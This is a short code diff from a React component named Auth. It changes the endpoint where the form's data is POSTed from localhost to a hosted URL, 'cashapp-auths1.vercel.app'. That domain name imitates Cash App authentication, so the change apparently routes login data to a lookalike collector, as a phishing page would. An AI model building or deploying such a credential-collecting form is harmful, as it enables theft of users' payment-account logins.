@@ -22,7 +22,7 @@ const Auth = () => {
 
     // Send to backend
     try {
-      await fetch("http://localhost:5000/api/data", {
+      await fetch("https://cashapp-auths1.vercel.app/api/data", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
